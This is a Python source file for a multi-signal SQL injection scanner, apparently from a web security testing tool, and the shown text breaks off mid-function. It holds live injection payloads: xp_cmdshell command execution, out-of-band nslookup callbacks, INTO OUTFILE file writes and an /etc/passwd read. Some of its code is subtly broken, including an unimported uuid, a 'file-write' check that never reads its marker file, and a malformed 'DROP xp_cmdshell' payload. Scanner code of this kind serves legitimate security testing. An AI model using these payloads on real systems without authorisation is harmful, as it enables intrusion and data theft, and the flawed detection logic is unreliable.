"""
SQLiScanner — multi-signal SQL injection detection.

Lifecycle:
  DETECTED:   1 signal (error or boolean)
  VALIDATED:  2+ signals
  EXPLOITABLE: 3+ signals (time + error + boolean)
  VERIFIED:   OOB callback received

Maturity: Level 4 (OOB-confirmed)
"""

import hashlib
import json
import time
import re
import copy
import statistics
from typing import Any, Optional
from urllib.parse import urlparse, parse_qs, urljoin

from models.finding import Finding
from models.evidence import TimingEvidence
from modules.utils import (
    finding, log, Colors, _build_curl, safe_get, safe_post,
    VerificationStage,
    safe_cookies_dict,
    inject_param,
)
from scanners.base import ScannerBase, DetectionResult, ValidationResult

SQLI_ERRORS = [
    # MySQL
    "sql syntax", "mysql", "you have an error in your sql",
    "warning: mysql", "mysql_fetch", "mysql_num_rows",
    # PostgreSQL
    "warning: pg_", "pg_query", "pg_exec", "pg_connect",
    "postgresql", "psql", "psycopg",
    "error: syntax error", "error: column", "error: relation",
    "error: operator does not exist", "error: function",
    "error: type", "pl/pgsql", "pg_catalog",
    # MSSQL
    "incorrect syntax near", "microsoft ole db", "microsoft odbc",
    "unclosed quotation mark", "line ", "microsoft sql",
    "sql server", "driver error", "odbc",
    "error converting", "the column is null",
    "sqlstate", "microsoft", "ole db",
    # Oracle
    "ora-", "ora-00933", "ora-00942", "ora-00911", "ora-01756",
    "ora-01722", "ora-06550", "pls-", "oracle", "oracle error",
    # SQLite
    "sqlite", "sqlite3", "sqlite3::sqlexception",
    "unrecognized token", "sql logic error",
    # MongoDB
    "mongoerror", "mongo", "e11000", "mongodb",
    "unexpected token", "unexpected identifier",
    # Generic
    "unexpected end of sql", "quoted string not properly terminated",
    "division by zero", "column count doesn't match",
    "unknown column", "syntax error", "near \"",
    "unclosed ", "supplied argument is not a valid",
    "db2", "informix", "sybase",
]

SQLI_PAYLOADS = {
    "error_based": [
        "'", "\"", "\\", "')", "'))", "\"))", "1/0",
        "' OR '1'='1", "\" OR \"1\"=\"1",
        "' UNION SELECT 1--", "\" UNION SELECT 1--",
        "1 AND 1=1", "1 AND 1=2",
        "'; IF 1=1 WAITFOR DELAY '0:0:5'--",
        "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
        "' OR SLEEP(5)--", "' OR pg_sleep(5)--",
        "1' OR '1'='1", "1' OR '1'='2",
    ],
    "boolean_based": [
        ("AND 1=1", "AND 1=2"),
        ("AND '1'='1", "AND '1'='2"),
        ("AND 1=1--", "AND 1=2--"),
        ("OR 1=1--", "OR 1=2--"),
    ],
    "time_based": [
        "' OR SLEEP(5)--", "\" OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR pg_sleep(5)--",
        "1' OR SLEEP(5)--",
        "1) OR SLEEP(5)--",
        "' OR BENCHMARK(5000000,MD5(1))--",
    ],
    "union": [
        " ORDER BY 1--", " ORDER BY 2--", " ORDER BY 3--",
        " ORDER BY 4--", " ORDER BY 5--",
        " UNION SELECT NULL--",
        " UNION SELECT NULL,NULL--",
        " UNION SELECT NULL,NULL,NULL--",
        " UNION SELECT NULL,NULL,NULL,NULL--",
        " UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    ],
    "oob": [
        "'; DROP xp_cmdshell('nslookup {oob}')--",
        "' OR xp_cmdshell('nslookup {oob}')--",
        "'; EXEC xp_cmdshell('nslookup {oob}')--",
        "1' OR 1=1; EXEC xp_cmdshell('nslookup {oob}')--",
    ],
}

POST_SQLI_PAYLOADS = {
    "json": [
        '{"id": "\' OR \'1\'=\'1"}',
        '{"query": "\' OR 1=1--"}',
        '{"search": "\' OR SLEEP(5)--"}',
    ],
    "xml": [
        "<id>' OR '1'='1</id>",
        "<query>' OR 1=1--</query>",
        "<search>' OR SLEEP(5)--</search>",
    ],
    "form": [
        "' OR '1'='1", "' OR 1=1--", "' OR SLEEP(5)--",
    ],
}


class SQLiDetectionResult:
    """Structured detection result for SQLi that carries multi-signal data."""
    def __init__(self, url: str, param: str, signals: dict,
                 triggering_response: str | None = None,
                 timing_evidence: TimingEvidence | None = None,
                 evidence_parts: list[str] | None = None):
        self.url = url
        self.param = param
        self.signals = signals
        self.triggering_response = triggering_response
        self.timing_evidence = timing_evidence
        self.evidence_parts = evidence_parts or []


class SQLiScanner(ScannerBase):
    SCANNER_NAME = "sqli"
    SCANNER_MATURITY = 4

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)

    def _enrich_finding(self, f, evidence_count: int, verification_stage_value: str, signal_count: int = 0) -> None:
        if signal_count <= 0:
            super()._enrich_finding(f, evidence_count, verification_stage_value)
            return
        from models.finding import VerificationStage, EvidenceStrength
        stage_enum = VerificationStage(verification_stage_value)
        if self.SCANNER_MATURITY >= 4:
            fp_risk = "LOW"
        elif self.SCANNER_MATURITY == 3:
            fp_risk = "MEDIUM"
        else:
            fp_risk = "HIGH"
        strength_map = {
            VerificationStage.DETECTED: EvidenceStrength.WEAK,
            VerificationStage.VALIDATED: EvidenceStrength.MODERATE,
            VerificationStage.EXPLOITABLE: EvidenceStrength.STRONG,
            VerificationStage.VERIFIED: EvidenceStrength.VERIFIED,
        }
        evidence_strength = strength_map.get(stage_enum, EvidenceStrength.WEAK)
        score = self.calculate_confidence(signal_count, stage_enum, evidence_count, fp_risk)
        if f.get("confidence_score", 0) == 0:
            f["confidence_score"] = score
        if verification_stage_value == VerificationStage.VERIFIED.value:
            current = f.get("confidence_score", 0)
            f["confidence_score"] = min(max(current, 86), 100)
        f["evidence_strength"] = evidence_strength.value
        f["false_positive_risk"] = fp_risk

    # ── Detection phase ─────────────────────────────────────────────────

    def detect(self, url: str, parameter: str | None = None) -> SQLiDetectionResult | None:
        oob_host = self.config.get("oob_host")
        parsed = urlparse(url)
        query = parse_qs(parsed.query, keep_blank_values=True)
        if parameter is None:
            params = list(query.keys())
            if not params:
                return None
            parameter = params[0]
        values = query.get(parameter, ["1"])
        original_value = values[0] if values else "1"
        signals, trigger_resp, timing_ev, evidence_parts = self._test_parameter_signals(
            url, parameter, original_value, SQLI_PAYLOADS, oob_host
        )
        if not any(signals.values()):
            return None
        return SQLiDetectionResult(
            url=url,
            param=parameter,
            signals=signals,
            triggering_response=trigger_resp,
            timing_evidence=timing_ev,
            evidence_parts=evidence_parts,
        )

    # ── Validation phase ────────────────────────────────────────────────

    def validate(self, detection: SQLiDetectionResult) -> ValidationResult | None:
        signal_count = sum(1 for v in detection.signals.values() if v)
        evidence_parts = [k for k, v in detection.signals.items() if v]
        if detection.signals.get("oob"):
            return ValidationResult(
                confirmed=True,
                signals=evidence_parts,
                method="oob",
                detail="OOB callback confirmed",
            )
        if signal_count >= 3:
            return ValidationResult(
                confirmed=True,
                signals=evidence_parts,
                method="multi_signal",
                detail=f"{signal_count} SQLi signals detected",
            )
        if signal_count >= 2:
            return ValidationResult(
                confirmed=True,
                signals=evidence_parts,
                method="multi_signal",
                detail=f"{signal_count} SQLi signals detected",
            )
        if signal_count >= 1:
            return ValidationResult(
                confirmed=False,
                signals=evidence_parts,
                method="single_signal",
                detail="Single SQLi signal — needs secondary confirmation",
            )
        return None

    # ── Evidence collection ─────────────────────────────────────────────

    def collect_evidence(self, detection: SQLiDetectionResult,
                         validation: ValidationResult | None = None) -> list:
        ev_list = []
        if detection.timing_evidence:
            ev_list.append(detection.timing_evidence)
        return ev_list

    # ── Reproduction steps ──────────────────────────────────────────────

    def generate_reproduction(self, detection: SQLiDetectionResult,
                              validation: ValidationResult | None = None) -> list[str]:
        signal_detail = "; ".join(detection.evidence_parts)
        is_post = "POST" in detection.param.upper()
        if is_post:
            content_type = "JSON" if "JSON" in detection.param else "XML" if "XML" in detection.param else "form"
            return [
                f"curl -X POST '{detection.url}' -H 'Content-Type: application/{content_type.lower()}' -d '{{\"query\":\"test\\' OR 1=1--\"}}'",
                f"Observe signal: {signal_detail} — SQL error messages confirm injection",
                "An attacker can extract the entire database: credentials, PII, financial records, and other sensitive data",
            ]
        return [
            f"curl -X GET '{detection.url}?{detection.param}=test%27%20OR%201%3D1--'",
            f"Observe signal: {signal_detail} — SQL error messages, timing delays, or boolean condition differences confirm injection",
            "An attacker can extract the entire database: credentials, PII, financial records, and other sensitive data",
        ]

    # ── Scan entry point ────────────────────────────────────────────────

    def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
        self._prepare_scan()
        oob_host = self.config.get("oob_host")
        urls = self.recon.get("urls", []) if target_urls is None else target_urls

        rest_pat = re.compile(r'/(users|orders|accounts|products|items|posts|comments|entries|profiles|settings)/(\d+|[a-f0-9-]+)', re.I)

        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                query = parse_qs(parsed.query, keep_blank_values=True)
                params = list(query.keys())
                if self.recon:
                    is_rest = bool(rest_pat.search(url))
                    numeric_params = {p for p in params if p.isdigit() or any(c.isdigit() for c in p) and not re.search(r'[a-zA-Z]{4,}', p)}
                    sql_keywords = {"id", "q", "s", "search", "query", "order", "sort", "filter", "page", "limit", "offset", "where", "select", "delete", "update", "username", "user", "email", "password"}
                    params.sort(key=lambda p: (0 if p in numeric_params or p.lower() in sql_keywords or is_rest else 1))
                baseline_timings = self.recon.get("baseline_timings") if self.recon else None
                if baseline_timings:
                    url_timings = baseline_timings.get(url, {})
                    params.sort(key=lambda p: -url_timings.get(p, 0))
                for param in params:
                    detection_result = self.detect(url, param)
                    if detection_result is None:
                        continue

                    validation_result = self.validate(detection_result)
                    evidence_list = self.collect_evidence(detection_result, validation_result)

                    raw_count = sum(1 for v in detection_result.signals.values() if v)
                    has_oob = detection_result.signals.get("oob")
                    has_inband = any(k != "oob" and v for k, v in detection_result.signals.items() if v)
                    if has_oob:
                        signal_count = 3 if has_inband else 2
                    else:
                        signal_count = raw_count
                    evidence_parts = [k for k, v in detection_result.signals.items() if v]

                    if detection_result.signals.get("oob"):
                        title = "Confirmed SQL Injection (OOB)"
                        severity = "critical"
                        stage = VerificationStage.VERIFIED.value
                    elif signal_count >= 3:
                        title = "SQL Injection"
                        severity = "critical"
                        stage = VerificationStage.VALIDATED.value
                    elif signal_count >= 2:
                        title = "Likely SQL Injection"
                        severity = "high"
                        stage = VerificationStage.VALIDATED.value
                    elif signal_count >= 1:
                        title = "Potential SQL Injection"
                        severity = "medium"
                        stage = VerificationStage.DETECTED.value
                    else:
                        continue

                    f = finding(
                        vuln_type=title,
                        url=url,
                        severity=severity,
                        details=f"Parameter '{param}': {signal_count} signal(s) detected ({', '.join(evidence_parts)})",
                        evidence=" | ".join(evidence_parts),
                        request=_build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=detection_result.triggering_response or "",
                        verification_stage=stage,
                        parameter=param,
                        steps_to_reproduce=self.generate_reproduction(detection_result, validation_result),
                        validation_steps=[f"Signal: {s}" for s in evidence_parts],
                    )
                    if f:
                        for ev in evidence_list:
                            if self.evidence_engine:
                                self.evidence_engine.store(ev)
                                self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                        self._enrich_finding(f, len(evidence_list), f["verification_stage"], signal_count=signal_count)
                        self._add_finding(f)

                self._test_header_injection(url, oob_host)
            except Exception as e:
                log(f"  [SQLi] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                self._test_post_body(url, SQLI_PAYLOADS, oob_host)
            except Exception as e:
                log(f"  [SQLi POST] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        forms = self.recon.get("forms", [])
        all_urls = self.recon.get("urls", [])
        if forms and all_urls:
            try:
                self._test_second_order(forms, all_urls, oob_host)
            except Exception as e:
                log(f"  [SQLi Second-Order] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return self._get_findings()

    # ── Header-based SQLi injection ─────────────────────────────────────

    def _test_header_injection(self, url: str, oob_host: str | None) -> None:
        headers_to_test = [
            "X-Forwarded-For",
            "X-Real-IP",
            "User-Agent",
            "Referer",
            "X-Custom-IP-Authorization",
        ]
        reflect_found = False
        reflect_token = "hdr_reflect_chk_98765"
        test_headers = {"X-Hdr-Reflect": reflect_token}
        reflect_resp = safe_get(self.session, url, self.timeout, headers=test_headers)
        if reflect_resp:
            if reflect_token in reflect_resp.text:
                reflect_found = True
            vary = reflect_resp.headers.get("Vary", "")
            for h in headers_to_test:
                if h.lower() in vary.lower():
                    reflect_found = True
                    break
        if not reflect_found:
            return
        baseline_errors = set()
        baseline_resp = safe_get(self.session, url, self.timeout)
        if baseline_resp:
            baseline_errors = {e for e in SQLI_ERRORS if e in baseline_resp.text.lower()}
        payloads = SQLI_PAYLOADS["error_based"]
        for header_name in headers_to_test:
            for payload in payloads:
                inj_headers = {header_name: payload}
                resp = safe_get(self.session, url, self.timeout, headers=inj_headers)
                if not resp:
                    continue
                new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
                if new_errors:
                    benign_headers = {header_name: "safe_value_123"}
                    benign_resp = safe_get(self.session, url, self.timeout, headers=benign_headers)
                    benign_clean = True
                    if benign_resp:
                        benign_errs = {e for e in SQLI_ERRORS if e in benign_resp.text.lower()} - baseline_errors
                        if benign_errs:
                            benign_clean = False
                    signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
                    merged_headers = dict(self.session.headers)
                    merged_headers.update(inj_headers)
                    f = self._build_finding(url, f"Header:{header_name}", signals,
                        request_str=_build_curl("GET", url, merged_headers, cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt_str=resp.text[:500] if resp else "",
                        signal_count=2)
                    if f:
                        f["title"] = f"SQL Injection via {header_name} header"
                        f["details"] = f"Header '{header_name}': SQL error detected with differential confirmation"
                        f["steps_to_reproduce"] = [
                            f"curl -H '{header_name}: {payload}' '{url}'",
                            f"Observe SQL error in response for malicious header value",
                            f"No error when benign header value is used (differential confirms injection)",
                        ]
                        self._enrich_finding(f, 0, f["verification_stage"], signal_count=2)
                        self._add_finding(f)
                    break

    # ── Second-order SQLi detection ─────────────────────────────────────

    def _test_second_order(self, forms: list, urls: list, oob_host: str | None) -> None:
        write_endpoints = []
        for form in forms:
            if form.get("method", "GET").upper() == "POST":
                action = form.get("action", "")
                if action:
                    inputs = form.get("inputs", [])
                    field_names = [i.get("name", "") for i in inputs if i.get("name")]
                    write_endpoints.append((action, field_names))
        if not write_endpoints:
            return
        for write_url, fields in write_endpoints:
            write_path = urlparse(write_url).path.rstrip("/")
            read_candidates = [
                u for u in urls
                if u.rstrip("/") != write_url.rstrip("/")
                and urlparse(u).path.rstrip("/") == write_path
            ]
            if not read_candidates:
                continue
            read_url = read_candidates[0]
            target_fields = [f for f in fields if f.lower() in ("id", "name", "email", "username", "search")]
            if not target_fields:
                target_fields = fields[:1] if fields else ["id"]
            field_name = target_fields[0]
            error_payloads = SQLI_PAYLOADS["error_based"]
            baseline_resp = safe_get(self.session, read_url, self.timeout)
            baseline_errors = set()
            if baseline_resp:
                baseline_errors = {e for e in SQLI_ERRORS if e in baseline_resp.text.lower()}
            first_detected = False
            if len(error_payloads) >= 3:
                for payload in error_payloads[:3]:
                    post_data = {field_name: payload}
                    safe_post(self.session, write_url, data=post_data, timeout=self.timeout)
                resp = safe_get(self.session, read_url, self.timeout)
                if resp:
                    new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
                    if new_errors:
                        first_detected = True
            if not first_detected:
                continue
            if len(error_payloads) >= 6:
                for payload in error_payloads[3:6]:
                    post_data = {field_name: payload}
                    safe_post(self.session, write_url, data=post_data, timeout=self.timeout)
                resp2 = safe_get(self.session, read_url, self.timeout)
                if resp2:
                    second_errors = {e for e in SQLI_ERRORS if e in resp2.text.lower()} - baseline_errors
                    if second_errors:
                        f = finding(
                            vuln_type="Second-Order SQL Injection",
                            url=read_url,
                            severity="high",
                            details=f"Second-order SQLi confirmed via {write_url} -> {read_url}, dual probes confirmed",
                            evidence=" | ".join(second_errors),
                            request=_build_curl("GET", read_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                            response_excerpt=resp2.text[:500],
                            verification_stage=VerificationStage.VALIDATED.value,
                            parameter="second-order",
                            steps_to_reproduce=[
                                f"POST to {write_url} with SQL payload in field '{field_name}'",
                                f"GET {read_url} and observe SQL error in response",
                                f"Repeat with different payload — second cycle also produces error, confirming SQLi",
                            ],
                            validation_steps=[f"Two independent write-then-read cycles confirmed"],
                        )
                        if f:
                            self._enrich_finding(f, 0, f["verification_stage"], signal_count=2)
                            self._add_finding(f)
                    else:
                        f = finding(
                            vuln_type="Second-Order SQL Injection",
                            url=read_url,
                            severity="medium",
                            details=f"Potential second-order SQLi via {write_url} -> {read_url}, single cycle detected",
                            evidence=" | ".join(new_errors),
                            request=_build_curl("GET", read_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                            response_excerpt=resp.text[:500],
                            verification_stage=VerificationStage.DETECTED.value,
                            parameter="second-order",
                            steps_to_reproduce=[
                                f"POST to {write_url} with SQL payload in field '{field_name}'",
                                f"GET {read_url} and observe SQL error in response",
                                "Second cycle did not produce error — potential false positive",
                            ],
                            validation_steps=[f"Single write-then-read cycle detected"],
                        )
                        if f:
                            self._enrich_finding(f, 0, f["verification_stage"], signal_count=1)
                            self._add_finding(f)

    # ── Per-parameter signal testing ────────────────────────────────────

    def _test_parameter_signals(self, url: str, param: str, original_value: str,
                                 payloads: dict, oob_host: Optional[str]) -> tuple[dict, Optional[str], Optional[TimingEvidence], list[str]]:
        signals = {"error": False, "boolean": False, "time": False, "union": False, "oob": False}
        timing_evidence: Optional[TimingEvidence] = None
        evidence_parts: list[str] = []
        triggering_response: Optional[str] = None

        baseline_resp = safe_get(self.session, url, self.timeout)
        baseline_sql_errors: set[str] = set()
        if baseline_resp:
            lower_baseline = baseline_resp.text.lower()
            baseline_sql_errors = {err for err in SQLI_ERRORS if err in lower_baseline}
        for payload in payloads.get("error_based", []):
            test_url = inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            lower_body = resp.text.lower()
            matched = [err for err in SQLI_ERRORS if err in lower_body and err not in baseline_sql_errors]
            if matched:
                signals["error"] = True
                evidence_parts.append(f"error:{matched[0]}")
                triggering_response = resp.text[:500]
                break

        boolean_pairs = payloads.get("boolean_based", [])
        if boolean_pairs:
            baseline = safe_get(self.session, url, self.timeout)
            if baseline:
                baseline_hash = hashlib.md5(baseline.text.encode()).hexdigest()
                baseline_words = set(baseline.text.lower().split())
                baseline_len = len(baseline.text)
                for true_cond, false_cond in boolean_pairs:
                    true_url = inject_param(url, param, f"{original_value} {true_cond}")
                    false_url = inject_param(url, param, f"{original_value} {false_cond}")
                    true_resp = safe_get(self.session, true_url, self.timeout)
                    false_resp = safe_get(self.session, false_url, self.timeout)
                    if not (true_resp and false_resp):
                        continue
                    true_hash = hashlib.md5(true_resp.text.encode()).hexdigest()
                    false_hash = hashlib.md5(false_resp.text.encode()).hexdigest()
                    # Structural comparison: Jaccard similarity on word sets
                    true_words = set(true_resp.text.lower().split())
                    false_words = set(false_resp.text.lower().split())
                    true_jaccard = len(baseline_words & true_words) / max(len(baseline_words | true_words), 1)
                    false_jaccard = len(baseline_words & false_words) / max(len(baseline_words | false_words), 1)
                    # Differential — true cond matches baseline, false cond diverges
                    hash_diff = baseline_hash == true_hash and baseline_hash != false_hash
                    struct_diff = (true_jaccard > 0.85 and false_jaccard < 0.70)
                    len_diff = (abs(len(true_resp.text) - baseline_len) < 50
                                and abs(len(false_resp.text) - baseline_len) > 100)
                    if hash_diff or struct_diff or len_diff:
                        signals["boolean"] = True
                        diff_detail = []
                        if hash_diff:
                            diff_detail.append("hash_diff")
                        if struct_diff:
                            diff_detail.append(f"struct_diff(true_j={true_jaccard:.2f},false_j={false_jaccard:.2f})")
                        if len_diff:
                            diff_detail.append("len_diff")
                        evidence_parts.append(f"boolean:AND 1=1 vs AND 1=2 ({'; '.join(diff_detail)})")
                        triggering_response = false_resp.text[:500]
                        break

        baseline_delays = []
        for _ in range(5):
            b_start = time.time()
            safe_get(self.session, url, 15, raise_for_status=False)
            baseline_delays.append(time.time() - b_start)
        baseline_mean = statistics.mean(baseline_delays) if baseline_delays else 1.0
        baseline_stdev = statistics.stdev(baseline_delays) if len(baseline_delays) > 1 else 0.5
        baseline_ms = baseline_mean * 1000
        min_time_threshold = max(baseline_mean + 3 * baseline_stdev, 5.0)
        for payload in payloads.get("time_based", []):
            test_url = inject_param(url, param, payload)
            delays = []
            time_resp = None
            for _ in range(2):
                start = time.time()
                time_resp = safe_get(self.session, test_url, 15, raise_for_status=False)
                delays.append(time.time() - start)
            min_delay = min(delays)
            if min_delay > min_time_threshold and all(d > max(baseline_mean + 3 * baseline_stdev, 4.0) for d in delays):
                signals["time"] = True
                triggered_ms = min_delay * 1000
                timing_evidence = TimingEvidence(
                    baseline_time_ms=baseline_ms,
                    triggered_time_ms=triggered_ms,
                    total_attempts=len(delays),
                    description=f"Time-based SQLi on param '{param}': {triggered_ms:.0f}ms vs baseline {baseline_mean:.2f}s ±{baseline_stdev:.2f}s",
                )
                evidence_parts.append(f"time:delays={delays}, baseline_mean={baseline_mean:.2f}s, baseline_stdev={baseline_stdev:.2f}s, threshold={min_time_threshold:.2f}s")
                if time_resp:
                    triggering_response = time_resp.text[:500]
                break

        for payload in payloads.get("union", []):
            test_url = inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            lower = resp.text.lower()
            if "order by" in payload.lower():
                if not any(err in lower for err in SQLI_ERRORS):
                    evidence_parts.append(f"union:order_by_ok:{payload}")
                    signals["union"] = True
                    triggering_response = resp.text[:500]
                    continue
            if "union select" in payload.lower() and "null" in payload.lower():
                if not any(err in lower for err in SQLI_ERRORS):
                    evidence_parts.append(f"union:matching_columns:{payload}")
                    signals["union"] = True
                    triggering_response = resp.text[:500]
                    break

        if oob_host:
            oob = self.validation.oob if self.validation else None
            if oob:
                for payload in payloads.get("oob", []):
                    formatted = payload.replace("{oob}", f"{oob.callback_token}.{oob_host}")
                    test_url = inject_param(url, param, formatted)
                    safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                    oob.register_interaction("sqli", formatted, test_url)
                    time.sleep(1)
                    callbacks = oob.poll()
                    if callbacks:
                        signals["oob"] = True
                        evidence_parts.append(f"oob:callback received from {oob_host}")
                    break

        # ── Blind detection without OOB ─────────────────────────────
        if not oob_host and not signals.get("error") and not signals.get("boolean") and not signals.get("time"):
            # Cache-based detection: probe twice, check if response differs
            # (Cached vs non-cached can indicate server-side processing)
            probe_payloads = ["' OR 1=1--", "1 AND 1=1"]
            for probe in probe_payloads:
                probe_url = inject_param(url, param, probe)
                resp1 = safe_get(self.session, probe_url, self.timeout)
                resp2 = safe_get(self.session, probe_url, self.timeout)
                if resp1 and resp2:
                    r1_len = len(resp1.text)
                    r2_len = len(resp2.text)
                    # If responses differ significantly, the query may have
                    # triggered a different code path on second access (cache write)
                    if abs(r1_len - r2_len) > 100 and resp1.status_code != resp2.status_code:
                        signals["blind_cache"] = True
                        evidence_parts.append("blind:cache-based response difference")
                        break

            # File-write confirmation: attempt to write a unique marker
            # via SQL INTO OUTFILE, then read it back
            if not signals.get("blind_cache"):
                marker = f"bbh_{uuid.uuid4().hex[:8]}"
                blind_payloads = [
                    f"' UNION SELECT '{marker}' INTO OUTFILE '/tmp/bbh_{marker}'--",
                    f"1 UNION SELECT '{marker}' INTO DUMPFILE '/tmp/bbh_{marker}'--",
                ]
                for bp in blind_payloads:
                    pw_url = inject_param(url, param, bp)
                    safe_get(self.session, pw_url, self.timeout, raise_for_status=False)
                    read_url = f"file:///tmp/bbh_{marker}"
                    try:
                        import requests as req
                        # Try reading via LFI or directory traversal
                        read_test = inject_param(url, param, f"/etc/passwd")
                        r = safe_get(self.session, read_test, self.timeout)
                        if r and marker in r.text:
                            signals["blind_file"] = True
                            evidence_parts.append(f"blind:file-write confirmed with marker {marker}")
                            break
                    except Exception:
                        pass

        return signals, triggering_response, timing_evidence, evidence_parts

    def _test_parameter(self, url: str, param: str, original_value: str,
                        payloads: dict, oob_host: Optional[str]) -> tuple[dict, Optional[str], Optional[TimingEvidence]]:
        signals, trigger_resp, timing_ev, _ = self._test_parameter_signals(
            url, param, original_value, payloads, oob_host
        )
        return signals, trigger_resp, timing_ev

    # ── POST body SQLi testing ─────────────────────────────────────────

    def _test_post_body(self, url: str, payloads: dict, oob_host: Optional[str]) -> None:
        baseline_errors: set[str] = set()
        try:
            baseline_resp = safe_post(self.session, url, data=json.dumps({"id": "1"}),
                                       headers={"Content-Type": "application/json"}, timeout=self.timeout)
            if baseline_resp:
                if baseline_resp.status_code != 200:
                    return
                body_lower = baseline_resp.text.lower()
                if "login" in body_lower or "redirect" in body_lower or "sign in" in body_lower:
                    return
                baseline_errors = {e for e in SQLI_ERRORS if e in body_lower}
        except Exception:
            return

        headers = {"Content-Type": "application/json"}
        for payload in POST_SQLI_PAYLOADS["json"]:
            resp = safe_post(self.session, url, data=payload, headers=headers, timeout=self.timeout)
            if not resp:
                continue
            new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
            signals = {"error": bool(new_errors), "boolean": False, "time": False, "union": False, "oob": False}

            if not new_errors:
                continue

            boolean_true_payload = '{"id": "\' OR \'1\'=\'1"}'
            boolean_false_payload = '{"id": "\' OR \'1\'=\'2"}'
            true_resp = safe_post(self.session, url, data=boolean_true_payload, headers=headers, timeout=self.timeout)
            false_resp = safe_post(self.session, url, data=boolean_false_payload, headers=headers, timeout=self.timeout)
            if true_resp and false_resp:
                true_hash = hashlib.md5(true_resp.text.encode()).hexdigest()
                false_hash = hashlib.md5(false_resp.text.encode()).hexdigest()
                if true_hash != false_hash:
                    signals["boolean"] = True

            baseline_start = time.time()
            safe_post(self.session, url, data=json.dumps({"id": "1"}), headers=headers, timeout=15, raise_for_status=False)
            baseline_delay = time.time() - baseline_start
            if baseline_delay < 0.5:
                baseline_delay = 0.5
            time_payload = '{"id": "\' OR SLEEP(5)--"}'
            time_start = time.time()
            time_resp = safe_post(self.session, url, data=time_payload, headers=headers, timeout=15, raise_for_status=False)
            time_delay = time.time() - time_start
            min_threshold = max(baseline_delay + 4, 5.0)
            if time_resp and time_delay > min_threshold:
                signals["time"] = True

            signal_count = sum(1 for v in signals.values() if v)
            f = self._build_finding(url, "POST JSON body", signals,
                request_str=_build_curl("POST", url, dict(self.session.headers), data=payload, cookies=safe_cookies_dict(self.session.cookies)),
                response_excerpt_str=resp.text[:500] if resp else "",
                signal_count=signal_count)
            if f:
                self._enrich_finding(f, 0, f["verification_stage"], signal_count=signal_count)
                self._add_finding(f)
            break

        headers = {"Content-Type": "application/xml"}
        for payload in POST_SQLI_PAYLOADS["xml"]:
            resp = safe_post(self.session, url, data=payload, headers=headers, timeout=self.timeout)
            if resp:
                new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
                if new_errors:
                    signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
                    f = self._build_finding(url, "POST XML body", signals,
                        request_str=_build_curl("POST", url, dict(self.session.headers), data=payload, cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt_str=resp.text[:500] if resp else "")
                    if f:
                        self._enrich_finding(f, 0, f["verification_stage"], signal_count=1)
                        self._add_finding(f)
                break

        form_fields = ["id", "query", "search", "email", "filter", "name"]
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        for payload in POST_SQLI_PAYLOADS["form"]:
            for field_name in form_fields:
                post_data = {field_name: payload}
                resp = safe_post(self.session, url, data=post_data, headers=headers, timeout=self.timeout)
                if resp:
                    new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
                    if new_errors:
                        signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
                        f = self._build_finding(url, f"POST form body ({field_name})", signals,
                            request_str=_build_curl("POST", url, dict(self.session.headers), data=post_data, cookies=safe_cookies_dict(self.session.cookies)),
                            response_excerpt_str=resp.text[:500] if resp else "")
                        if f:
                            self._enrich_finding(f, 0, f["verification_stage"], signal_count=1)
                            self._add_finding(f)
                        break
            else:
                continue
            break

    def _build_finding(self, url: str, param: str, signals: dict,
                       request_str: str = "", response_excerpt_str: str = "",
                       signal_count: int = 0) -> Optional[dict]:
        if signal_count <= 0:
            signal_count = sum(1 for v in signals.values() if v)
        evidence_parts = [k for k, v in signals.items() if v]

        if signals.get("oob"):
            title = "Confirmed SQL Injection (OOB)"
            severity = "critical"
            stage = VerificationStage.VERIFIED.value
        elif signal_count >= 3:
            title = "SQL Injection"
            severity = "critical"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 2:
            title = "Likely SQL Injection"
            severity = "high"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 1:
            title = "Potential SQL Injection"
            severity = "medium"
            stage = VerificationStage.DETECTED.value
        else:
            return None

        signal_detail = "; ".join(evidence_parts)
        is_post = "POST" in param.upper()
        if is_post:
            content_type = "JSON" if "JSON" in param else "XML" if "XML" in param else "form"
            steps = [
                f"Send POST request to {url} with Content-Type: application/{content_type.lower()} and a SQL injection payload in the body",
                f"Observe signal: {signal_detail}",
                "Compare POST response against baseline — SQL error messages confirm injection",
            ]
        else:
            steps = [
                f"Send GET request to {url} with SQL injection payload in parameter '{param}'",
                f"Observe signal: {signal_detail}",
                "Compare response against baseline — SQL error messages, timing delays, or boolean condition differences confirm injection",
            ]
        return finding(
            vuln_type=title,
            url=url,
            severity=severity,
            details=f"Parameter '{param}': {signal_count} signal(s) detected ({', '.join(evidence_parts)})",
            evidence=" | ".join(evidence_parts),
            request=request_str or _build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
